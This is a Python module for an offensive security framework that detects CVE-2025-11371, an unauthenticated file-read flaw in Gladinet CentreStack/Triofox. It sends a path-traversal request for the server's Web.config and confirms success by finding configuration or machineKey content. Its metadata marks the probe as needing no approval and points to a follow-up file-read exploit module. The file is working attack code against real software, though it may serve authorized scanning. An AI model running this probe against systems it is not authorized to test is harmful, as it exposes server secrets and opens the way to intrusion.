#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gladinet CentreStack/Triofox temp download LFI (CVE-2025-11371)."""

import re
import urllib.parse

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gladinet CentreStack/Triofox - LFI Detection (CVE-2025-11371)',
        'description': (
            'Detects CVE-2025-11371 unauthenticated file read on /storage/t.dn via the s= '
            'parameter (Gladinet UploadDownloadProxy TempDownload handler).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'gladinet', 'centrestack', 'triofox', 'lfi', 'kev', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.35,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/gladinet_cve_2025_11371_file_read',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-11371',
            'https://www.huntress.com/blog/gladinet-centrestack-triofox-local-file-inclusion-flaw',
        ],
        'cve': 'CVE-2025-11371',
    }

    probe_path = OptString(
        '..\\..\\..\\Program Files (x86)\\Gladinet Cloud Enterprise\\root\\Web.config',
        's= traversal target for detection',
        required=False,
    )

    def run(self):
        target = str(self.probe_path or '').strip()
        qs = urllib.parse.urlencode({'s': target, 'sid': '1'})
        path = f'/storage/t.dn?{qs}'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if re.search(r'<configuration|<machineKey', body, re.I):
            self.set_info(
                severity='critical',
                reason='Gladinet CVE-2025-11371 LFI confirmed (Web.config)',
                path=path,
            )
            return True
        return False
